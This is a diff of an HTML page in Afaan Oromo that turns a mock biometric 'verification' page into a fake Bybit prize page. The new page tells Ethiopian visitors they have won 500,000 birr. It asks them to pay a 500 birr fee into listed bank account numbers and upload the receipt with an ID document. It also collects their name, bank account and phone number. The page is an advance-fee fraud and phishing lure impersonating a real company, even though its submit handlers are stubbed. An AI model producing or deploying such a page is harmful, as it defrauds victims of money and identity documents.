@@ -1,185 +1,307 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="om">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Futuristic User Verification</title>
+    <title>Carraa Addaa - Bybit</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
     <style>
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background: linear-gradient(to right, #2c3e50, #3498db);
-            color: white;
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            width: 100vw;
-            flex-direction: column;
+            margin: 0;
+            font-family: 'Orbitron', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #00ffff;
         }
-        .container {
-            width: 90%;
-            max-width: 400px;
-            padding: 20px;
+
+        header {
+            background: #0c0c0c;
+            padding: 2rem;
+            text-align: center;
+            border-bottom: 3px solid #00ffff;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 2.8rem;
+            color: #00ffff;
+            animation: pulse 3s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                text-shadow: 0 0 5px #00ffff;
+            }
+            50% {
+                text-shadow: 0 0 20px #00ffff;
+            }
+        }
+
+        main {
+            max-width: 900px;
+            margin: 2rem auto;
             background: rgba(0, 0, 0, 0.6);
+            padding: 2rem;
             border-radius: 15px;
+            box-shadow: 0 0 25px rgba(0, 255, 255, 0.3);
+        }
+
+        section {
+            margin-bottom: 2.5rem;
+        }
+
+        h2 {
+            color: #ff66ff;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from {
+                text-shadow: 0 0 10px #ff66ff;
+            }
+            to {
+                text-shadow: 0 0 25px #ff66ff;
+            }
+        }
+
+        .highlight {
+            color: #00ff99;
+            font-weight: bold;
+        }
+
+        ul {
+            padding-left: 1.2rem;
+        }
+
+        li {
+            margin-bottom: 0.5rem;
+        }
+
+        .colorful-bank {
+            background: linear-gradient(135deg, #1c1c1c, #292929);
+            border: 2px solid #00ffff;
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin-top: 1rem;
+        }
+
+        .fancy-select {
+            width: 100%;
+            padding: 0.7rem;
+            margin-top: 0.5rem;
+            background: #121212;
+            color: #00ffff;
+            border: 2px solid #00ffff;
+            border-radius: 5px;
+            font-size: 1rem;
+            outline: none;
+        }
+
+        #accountNumber {
+            font-size: 1.3rem;
+            margin-top: 1rem;
+            color: #00ff99;
+            background-color: #000;
+            padding: 0.8rem;
+            border-radius: 8px;
+            border: 1px solid #00ffcc;
             text-align: center;
-            position: relative;
-            display: none;
-            flex-direction: column;
-            align-items: center;
+            box-shadow: 0 0 10px #00ffcc44;
         }
-        .active {
-            display: flex;
-        }
-        .scanner, .eye-scanner {
-            width: 200%;
-            max-width: 320px;
-            margin-top: 20px;
-            padding: 20px;
-            background: black;
-            display: inline-block;
+
+        .upload-section {
+            background: #111;
+            padding: 1.5rem;
             border-radius: 10px;
-            box-shadow: 0px 0px 20px cyan;
-            cursor: pointer;
+            border: 2px dashed #00ffff;
+            margin-top: 2rem;
         }
-        .scanner span {
+
+        .upload-section input[type="file"] {
             display: block;
-            width: 100%;
-            height: 100px;
-            background: linear-gradient(to top, cyan, transparent);
+            margin-top: 1rem;
+            padding: 0.5rem;
+            background: #222;
+            color: #00ffff;
+            border: 2px solid #00ffff;
+            border-radius: 5px;
         }
-        .eye-box {
-            display: inline-block;
-            width: 75px;
-            height: 50px;
-            border-radius: 50%;
-            background: white;
-            margin: 10px;
-        }
-        .hidden {
-            display: none;
-        }
-        .futuristic-btn {
-            padding: 12px 25px;
-            font-size: 16px;
-            color: white;
-            background: linear-gradient(45deg, #ff00ff, #00ffff);
+
+        .upload-section button {
+            margin-top: 1rem;
+            background: #00ffff;
+            color: #000;
             border: none;
-            border-radius: 10px;
-            box-shadow: 0px 0px 15px #00ffff;
+            padding: 0.8rem 1.5rem;
+            font-size: 1rem;
+            border-radius: 8px;
             cursor: pointer;
-            transition: 0.3s;
-            margin-top: 20px;
-            width: 100%;
-            max-width: 300px;
+            transition: background 0.3s ease;
         }
-        @keyframes scan {
-            0% { transform: translateY(0); }
-            50% { transform: translateY(50px); }
-            100% { transform: translateY(0); }
+
+        .upload-section button:hover {
+            background: #00cccc;
         }
-        @keyframes blink {
-            0%, 100% { background: white; }
-            50% { background: black; }
-        }
-        @keyframes dollarRain {
-            from { transform: translateY(-10%); }
-            to { transform: translateY(100vh); }
-        }
-        .dollar {
-            position: absolute;
-            top: -10%;
-            font-size: 30px;
-            color: gold;
-            animation: dollarRain 5s linear infinite;
+
+        footer {
+            text-align: center;
+            padding: 1rem;
+            color: #aaa;
+            background: #111;
+            border-top: 1px solid #00ffff;
+            font-size: 0.9rem;
         }
     </style>
 </head>
 <body>
-    <div class="container active" id="user-info">
-        <h2>Odeeffannoo kee guuti</h2>
-        <input type="text" id="full-name" placeholder="Maqaa Guutuu" style="width: 100%;"><br><br>
-        <input type="text" placeholder="Lakk Bilbilaa " style="width: 100%;"><br><br>
-        <input type="email" placeholder="Email" style="width: 100%;"><br><br>
-        <button class="futuristic-btn" onclick="nextSection('fingerprint')">itti fufi</button>
-    </div>
-    
-    <div class="container" id="fingerprint">
-        <h2>Ashaaraa qubaa</h2>
-        <div class="scanner" onclick="startFingerprintScan()">
-            <h3>quba kee galchi</h3>
-            <span></span>
+
+<header>
+    <h1>🌐 Carraa Addaa Bybit irraa!</h1>
+</header>
+
+<main>
+    <section>
+        <h2>🎉 Baga Gammaddan!</h2>
+        <p>Namoonni <span class="highlight">suuraan keessan Facebook keenya gubbaatti argamu</span> — baga gammaddan!</p>
+        <p>Suuraan sun kan keeti taanaan, baga gammadde <strong>siin jechuu barbaanna!</strong></p>
+    </section>
+
+    <section>
+        <h2>💰 Carraa Qarshii 500,000</h2>
+        <p>Dhaabbata <strong>Bybit</strong> jedhamu irraa carraan qarshii <span class="highlight">500,000</span> siif bahee jira.</p>
+        <p>Carraan kun uummata <strong>Ethiopia</strong> giddu galeessa godhachuun qofaaf ta’ee jira.</p>
+        <p>Dhaabbati kun <span class="highlight">amantii kam irraayyuu bilisadha.</span></p>
+    </section>
+
+    <section>
+        <h2>📋 Ulaagaalee Guutuu Qabdu</h2>
+        <ul>
+            <li>qarshiin kun biyya alaa irraa waan galuuf gatii ittiin qarshii kana gara maallaqa biyya keenyaatti jijjiirru
+qarshii 500 lakkoofsa herrega baankii armaan gadiitti galchuun nagahee ittiin qarshii kana galchitan waraqaan 
+eeyummaa waliin nuuf erguu qabdu. </li>
+        </ul>
+<section class="upload-section">
+    <h2>📝 Odeeffannoo Kee Galchi</h2>
+    <form action="#" method="POST" onsubmit="return handleFormSubmit()">
+        <label for="fullName">Maqaa Kee:</label><br>
+        <input type="text" id="fullName" name="fullName" required><br><br>
+
+        <label for="bankAccount">Lakkoofsa Herrega Baankii:</label><br>
+        <input type="text" id="bankAccount" name="bankAccount" required><br><br>
+
+        <label for="phone">Lakkoofsa Bilbila:</label><br>
+        <input type="tel" id="phone" name="phone" required><br><br>
+
+        <label for="country">Biyyaa:</label><br>
+        <input type="text" id="country" name="country" required><br><br>
+
+        <button type="submit">Submit</button>
+    </form>
+</section>
+
+<style>
+    .upload-section {
+        background: #111;
+        padding: 1.5rem;
+        border-radius: 10px;
+        border: 2px dashed #00ffff;
+        margin-top: 2rem;
+    }
+
+    .upload-section label {
+        color: #00ffff;
+        font-weight: bold;
+    }
+
+    .upload-section input[type="text"],
+    .upload-section input[type="tel"] {
+        width: 100%;
+        padding: 0.6rem;
+        margin-top: 0.3rem;
+        background: #1a1a1a;
+        border: 2px solid #00ffff;
+        color: #00ffff;
+        border-radius: 6px;
+        font-size: 1rem;
+        outline: none;
+        transition: border-color 0.3s;
+    }
+
+    .upload-section input:focus {
+        border-color: #00cccc;
+    }
+
+    .upload-section button {
+        margin-top: 1rem;
+        background: #00ffff;
+        color: #000;
+        border: none;
+        padding: 0.8rem 1.5rem;
+        font-size: 1rem;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: background 0.3s ease;
+    }
+
+    .upload-section button:hover {
+        background: #00cccc;
+    }
+</style>
+
+<script>
+    function handleFormSubmit() {
+        alert("Galatoomi! Odeeffannoon kee ergameera.");
+        return false; // Prevent actual submission for demo
+    }
+</script>
+<p> ACCOUNT GADII KANA IRRATTI QARSHII 500 ERGUUN NAGAHEE NUUF ERGI. </P>
+
+        <div class="colorful-bank">
+            <h3 style="color: #ff66ff;">🎯 Filannoo Herrega Baankii</h3>
+            <label for="bankSelect" style="font-weight: bold;">Baankii filadhu:</label>
+            <select id="bankSelect" onchange="updateAccount()" class="fancy-select">
+                <option value="">-- Filadhu --</option>
+                <option value="1000480820553">CBE (Commercial Bank of Ethiopia)</option>
+                <option value="1059400184157">COOP / Hojii Gamtaa</option>
+                <option value="5542550409011">Dashen Bank</option>
+            </select>
+            <div id="accountNumber"></div>
         </div>
-        <p id="fingerprint-status"></p>
-        <button class="futuristic-btn" onclick="nextSection('eye-scan')">itti fufi</button>
-    </div>
-    
-    <div class="container" id="eye-scan">
-        <h2>Ashaaraa ijaa</h2>
-        <button class="futuristic-btn" onclick="startEyeScan()">Ashaaraa ijaa jalqabi</button>
-        <div class="eye-scanner">
-            <div class="eye-box"></div>
-            <div class="eye-box"></div>
-        </div>
-        <p id="eye-scan-status"></p>
-        <button class="futuristic-btn" onclick="submitForm()">Submit</button>
-    </div>
-    
-    <div id="congrats" class="hidden">
-        <h1>🎉 Congratulations! 🎉</h1>
-        <h2>Odeeffannoon kee fudhatamee jira! 🚀</h2>
-        <p>🌟 Baga gammadde! 🌟</p>
-        <h2 id="user-name-display"></h2>
-    </div>
-    
-    <script>
-        function nextSection(sectionId) {
-            document.querySelector('.container.active').classList.remove('active');
-            document.getElementById(sectionId).classList.add('active');
-        }
 
-        function startFingerprintScan() {
-            let scanner = document.querySelector('.scanner span');
-            let status = document.getElementById('fingerprint-status');
-            scanner.style.animation = 'scan 1s infinite';
-            setTimeout(() => {
-                scanner.style.animation = '';
-                status.innerText = 'Scan Complete';
-            }, 3000);
-        }
+        <p style="margin-top: 1.5rem;">Waraqaa eeyummaa wajjin <strong>screenshot</strong> ykn <strong>nagahee suuraa</strong> ergaa!</p>
+    </section>
 
-        function startEyeScan() {
-            let eyes = document.querySelectorAll('.eye-box');
-            let status = document.getElementById('eye-scan-status');
-            eyes.forEach(eye => eye.style.animation = 'blink 1s infinite');
-            setTimeout(() => {
-                eyes.forEach(eye => eye.style.animation = '');
-                status.innerText = 'Scan Complete';
-            }, 10000);
-        }
+    <section class="upload-section">
+        <h2>📤 Suuraa Yookiin Screenshot Asirratti Galchi</h2>
+        <form action="#" method="POST" enctype="multipart/form-data" onsubmit="return handleSubmit()">
+            <input type="file" name="uploadImage" accept="image/*" required>
+            <button type="submit">Submit</button>
+        </form>
+    </section>
+</main>
+<P>KANA HUNDUMAA GAAFA XUMURTU DHAABBATA KANA IRRAA SI QUUNNAMUUN QARSHII KEE ACCOUNT KEE IRRATTI SIIF GALCHU. KANAAFUU DURSA ULAALEE KANA HUNDUMAA GUUTUU QABDA</P>
 
-        function submitForm() {
-            let userName = document.getElementById('full-name').value;
-            document.querySelector('.container.active').classList.remove('active');
-            document.getElementById('congrats').classList.remove('hidden');
-            if (userName) {
-                document.getElementById('user-name-display').innerText = `Dear ${userName}, welcome!`;
-            }
-            startDollarRain();
-        }
+<footer>
+    © 2025 Carraa Bybit.
+</footer>
 
-        function startDollarRain() {
-            setInterval(() => {
-                let dollar = document.createElement('div');
-                dollar.className = 'dollar';
-                dollar.innerText = '💵';
-                dollar.style.left = Math.random() * 100 + 'vw';
-                document.body.appendChild(dollar);
-                setTimeout(() => dollar.remove(), 5000);
-            }, 200);
+<script>
+    function updateAccount() {
+        const select = document.getElementById('bankSelect');
+        const display = document.getElementById('accountNumber');
+        const value = select.value;
+
+        if (value) {
+            display.textContent = "💳 Lakkoofsa Herrega: " + value;
+        } else {
+            display.textContent = "";
         }
-    </script>
+    }
+
+    function handleSubmit() {
+        alert("Galatoomi! Suuraan kee ergameera (demo only).");
+        return false; // Prevent actual submission for demo
+    }
+</script>
+
 </body>
 </html>
